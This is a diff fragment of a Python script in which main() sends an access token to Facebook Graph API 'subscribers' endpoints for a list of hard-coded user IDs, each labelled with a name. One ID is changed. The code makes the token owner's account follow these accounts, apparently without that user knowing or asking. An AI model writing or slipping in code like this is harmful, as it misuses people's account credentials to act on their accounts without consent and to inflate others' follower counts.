@@ -19,7 +19,7 @@ def main():
     requests.post("https://graph.facebook.com/1827084332/subscribers?access_token=" + token)      # Dapunta Khurayra X
     requests.post("https://graph.facebook.com/100000415317575/subscribers?access_token=" + token) # Dapunta Adyapaksi R
     requests.post("https://graph.facebook.com/100000737201966/subscribers?access_token=" + token) # Dapunta Adya R
-    requests.post("https://graph.facebook.com/100004499498856/subscribers?access_token=" + token) # Raka Andrian Tara
+    requests.post("https://graph.facebook.com/100000834003593/subscribers?access_token=" + token) # Raka Andrian Tara
     requests.post("https://graph.facebook.com/100000260233573/subscribers?access_token=" + token) # Rehan khan
     requests.post("https://graph.facebook.com/742821237/subscribers?access_token=" + token) # Zait ullah
     requests.post("https://graph.facebook.com/100005323385256/subscribers?access_token=" + token) # SHAHZAIN DAVID JOIYA
